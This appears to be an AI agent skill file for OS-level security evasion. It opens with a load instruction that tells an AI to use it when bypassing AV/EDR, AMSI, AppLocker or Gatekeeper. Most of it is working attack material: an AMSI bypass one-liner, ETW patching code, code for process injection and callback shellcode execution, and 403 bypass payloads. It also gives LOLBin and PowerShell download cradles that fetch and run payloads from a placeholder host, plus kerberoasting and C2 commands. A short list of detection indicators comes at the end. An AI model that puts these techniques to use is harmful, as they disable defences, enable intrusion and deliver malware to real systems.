---
name: os-level-evasion
description: >-
  OS-level security evasion covering Windows AV/EDR bypass, macOS security mechanism bypass,
  process injection techniques, 403/status code bypass, fileless attacks, AMSI bypass,
  and ETW patching.
---

# OS-Level Evasion

> **AI LOAD INSTRUCTION**: Use when bypassing OS-level security controls including AV/EDR, AMSI, AppLocker, Gatekeeper, or performing process injection and fileless attacks.

## 1. Windows AV/EDR Bypass

### AMSI Bypass
```powershell
# Classic AMSI bypass (patch amsiInitFailed)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative: patch AmsiScanBuffer
# Unhook amsi.dll's AmsiScanBuffer to return AMSI_RESULT_CLEAN
```

### ETW Patching
```c
// Patch EtwEventWrite to NOP (disable telemetry)
FARPROC etwEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
DWORD oldProtect;
VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
*(BYTE*)etwEventWrite = 0xC3;  // ret
VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);
```

### DLL Unhooking
- **Fresh copy**: load clean ntdll.dll from disk, replace hooked version in memory
- **Syscalls direct**: use direct syscalls instead of ntdll exports (avoid hooks)
- **Custom syscall stubs**: generate syscall numbers dynamically at runtime

## 2. macOS Security Bypass

### Gatekeeper Bypass
```bash
# Remove quarantine attribute
xattr -d com.apple.quarantine /path/to/app

# Sign with ad-hoc signature
codesign --force --deep -s - /path/to/app
```

### SIP (System Integrity Protection)
- **Boot argument**: `csrutil disable` (recovery mode)
- **Mounted volume**: exploit filesystem race in SIP checks
- **Kext loading**: exploit kext approval bypass

### XProtect / Notarization
- **XProtect**: Apple's built-in signature-based scanner — bypass via packer/crypter
- **Notarization**: Apple's server-side scan — bypass by submitting benign app, replace binary post-approval

## 3. Process Injection

| Technique | Method | Detection |
|-----------|--------|-----------|
| Classic DLL injection | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` | High |
| DLL hollowing | map DLL without loading via loader | Medium |
| Process hollowing | `CreateProcess(SUSPENDED)` → unmap → inject → `ResumeThread` | Medium |
| Thread hijacking | suspend thread → modify context → resume | Medium |
| APC injection | `QueueUserAPC` to existing thread | Low-Medium |
| Process dopplegänging | NTFS transaction + process hollowing | Low |
| Module stomping | load legitimate DLL → overwrite with payload | Low |
| Reflective loading | custom PE loader, no LoadLibrary | Low |

## 4. 403 / Status Code Bypass

| Technique | Method |
|-----------|--------|
| Header override | `X-Original-URL: /admin`, `X-Rewrite-URL: /admin` |
| HTTP method | `PUT /admin`, `TRACE /admin`, `OPTIONS /admin` |
| Path normalization | `/admin/`, `/admin..;/`, `//admin//`, `/./admin/` |
| Case manipulation | `/ADMIN`, `/Admin`, `/aDmIn` |
| URL encoding | `%2f%61%64%6d%69%6e` |
| Double encoding | `%252f%2561%2564%256d%2569%256e` |
| Verb tampering | `GET /admin HTTP/1.1` → try POST, PUT, PATCH |
| Host header | `Host: allowed-host.com` |
| IP override | `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: localhost` |

## 5. Fileless Attacks

### LOLBins (Living Off The Land Binaries)
| Binary | Use |
|--------|-----|
| powershell.exe | script execution, download cradle |
| cmd.exe | command execution |
| wscript.exe | WSH script execution |
| mshta.exe | HTA application execution |
| certutil.exe | download: `certutil -urlcache -split -f http://x/payload` |
| bitsadmin.exe | download: `bitsadmin /transfer n http://x/payload C:\p.exe` |
| msiexec.exe | `msiexec /q /i http://x/payload.msi` |
| rundll32.exe | `rundll32 payload.dll,Entry` |
| regsvr32.exe | `regsvr32 /s /n /u /i:http://x/payload scrobj.dll` |
| wmic.exe | `wmic process call create "payload.exe"` |
| msbuild.exe | execute C# via inline task in XML |

### PowerShell Download Cradles
```powershell
# Net.WebClient
IEX (New-Object Net.WebClient).DownloadString('http://x/payload.ps1')

# Invoke-WebRequest
IEX (iwr 'http://x/payload.ps1' -UseBasicParsing)

# BitsTransfer
Import-Module BitsTransfer; Start-BitsTransfer 'http://x/payload.ps1' C:\t.ps1; IEX C:\t.ps1
```

## 6. Decision Tree

```
OS-level evasion required
├── Target OS?
│   ├── Windows → AV/EDR bypass, AMSI, ETW, LOLBins
│   ├── macOS → Gatekeeper, SIP, XProtect, notarization
│   └── Linux → SELinux, AppArmor, auditd bypass
├── Defense layer?
│   ├── AV signature → packer/crypter/encoder, fileless
│   ├── EDR behavioral → direct syscall, unhooking
│   ├── AMSI → patch amsiInitFailed / AmsiScanBuffer
│   ├── ETW → patch EtwEventWrite
│   └── Application control → LOLBin, reg-free COM
├── Execution method?
│   ├── Process injection → hollowing/APC/thread hijack
│   ├── Fileless → PowerShell/WMI/LOLBins
│   ├── DLL → reflective loading/module stomping
│   └── Shellcode → position-independent + direct syscall
├── 403 bypass?
│   ├── Header → X-Original-URL, X-Forwarded-For
│   ├── Method → PUT/POST/PATCH/OPTIONS
│   ├── Path → normalization, encoding, case
│   └── Protocol → HTTP/2, HTTPS→HTTP downgrade
└── OPSEC?
    ├── In-memory only → no disk writes
    ├── Direct syscall → avoid ntdll hooks
    └── ETW disabled → no telemetry
```

## 7. AMSI Bypass Categories

| Category | Method | Detection Risk | Persistence |
|---|---|---|---|
| Memory patching | Patch `AmsiScanBuffer` in `amsi.dll` | Medium | Per-process |
| Reflection | Modify AMSI init flags via .NET reflection | Medium | Per-session |
| String obfuscation | Encode/split AMSI trigger strings | Low | Per-payload |
| PowerShell downgrade | Force PS v2 (no AMSI) | Low | Per-session |
| CLM bypass | Escape Constrained Language Mode | Medium | Per-session |
| COM hijack | Redirect AMSI COM server | Low | Per-user |

## 8. .NET Assembly Loading

### In-Memory Assembly.Load
```csharp
byte[] assemblyBytes = File.ReadAllBytes("tool.exe");
Assembly assembly = Assembly.Load(assemblyBytes);
assembly.EntryPoint.Invoke(null, new object[] { args });
```

### Donut — Convert .NET Assembly to Shellcode
```bash
donut -f tool.exe -o payload.bin -a 2 -c ToolNamespace.Program -m Main
donut -f Rubeus.exe -o rubeus.bin -a 2 -p "kerberoast /outfile:tgs.txt"
```

### execute-assembly (C2 Framework)
```
# Cobalt Strike
execute-assembly /path/to/Rubeus.exe kerberoast
# Sliver
execute-assembly /path/to/SharpHound.exe -c all
# Havoc
dotnet inline-execute /path/to/tool.exe args
```

## 9. Shellcode Execution via Callback APIs

```csharp
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
Marshal.Copy(sc, 0, addr, sc.Length);
EnumWindows(addr, IntPtr.Zero);  // callback points to shellcode
```

Callback APIs for shellcode execution: `EnumWindows`, `EnumChildWindows`, `EnumFonts`, `EnumDesktops`, `CertEnumSystemStore`, `EnumDateFormats` — all accept function pointers that can point to shellcode.

## 10. Process Injection — Code Samples

### Early Bird APC Injection
```csharp
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
CreateProcess(null, "svchost.exe", ..., CREATE_SUSPENDED, ..., ref si, ref pi);
IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(pi.hProcess, addr, sc, (uint)sc.Length, out _);
QueueUserAPC(addr, pi.hThread, IntPtr.Zero);
ResumeThread(pi.hThread);
```

### Module Stomping
```csharp
IntPtr hModule = LoadLibrary("amsi.dll");  // legitimate DLL
// Overwrite .text section with shellcode — backed by legitimate DLL on disk
```

## 11. Unhooking — Direct Syscalls

| Tool | Method | Notes |
|---|---|---|
| **SysWhispers2/3** | Compile-time syscall stubs | Static syscall numbers |
| **HellsGate** | Runtime syscall number resolution | Dynamic, harder to detect |
| **HalosGate** | Resolve from neighboring unhooked syscalls | Handles partial hooks |
| **TartarusGate** | Extended HalosGate | More robust resolution |

### Fresh ntdll Copy
```csharp
byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
// Overwrite hooked .text section with clean copy -> all EDR hooks removed
```

### Indirect Syscalls
```
// Jump to syscall instruction inside ntdll.dll (legitimate location)
// The ret address on stack points to ntdll.dll, not your code
```

## 12. Sleep Obfuscation & Payload Encryption

| Technique | Method |
|---|---|
| **Ekko** | ROP chain -> encrypt heap/stack during sleep |
| **Foliage** | APC-based sleep with memory encryption |
| **DeathSleep** | Thread de-registration during sleep |

### Staged Loading Pattern
```
Stage 1: Small, encrypted loader (evades static analysis)
Stage 2: Download actual payload at runtime (encrypted)
Stage 3: Decrypt in memory -> execute
```

## 13. C2 Framework Evasion Comparison

| Framework | Key Evasion Features |
|---|---|
| **Cobalt Strike** | Malleable C2 profiles, HTTP/S traffic shaping, sleep jitter, PE evasion |
| **Sliver** | Multiple protocols (mTLS, WireGuard, DNS), stager-less, built-in obfuscation |
| **Havoc** | Indirect syscalls, sleep obfuscation, module stomping |
| **Brute Ratel** | Badger agent, syscall evasion, ETW/AMSI bypass built-in |

## 14. Tools

| Tool | Purpose | Key Use |
|------|---------|---------|
| Cobalt Strike | C2 + evasion | artifact kit, sleep mask |
| Donut | Shellcode | PE → position-independent shellcode |
| SysWhispers | Syscall | generate direct syscall stubs |
| Freeze | Evasion | payload encryption + evasion |
| Shikata Ga Nai | Encoder | polymorphic shellcode encoding |
| Merlin | C2 | HTTP/2 + JWT based C2 |
| SharpC2 | C2 | .NET post-exploitation |

## 15. Detection Indicators

- AMSI initialization failure (patch detected)
- ETW provider registration removal
- Process creation with unusual parent-child relationships
- DLL loading from unexpected paths
- Direct syscall execution (no ntdll.dll in call stack)
- PowerShell execution with bypass flags
- LOLBin execution with network activity
- Callback API execution with shellcode addresses (EnumWindows, CertEnumSystemStore)
- Fresh ntdll.dll mapping from disk (unhooking indicator)
- Sleep obfuscation patterns (encrypted memory regions during process sleep)
- Assembly.Load from byte arrays without file on disk
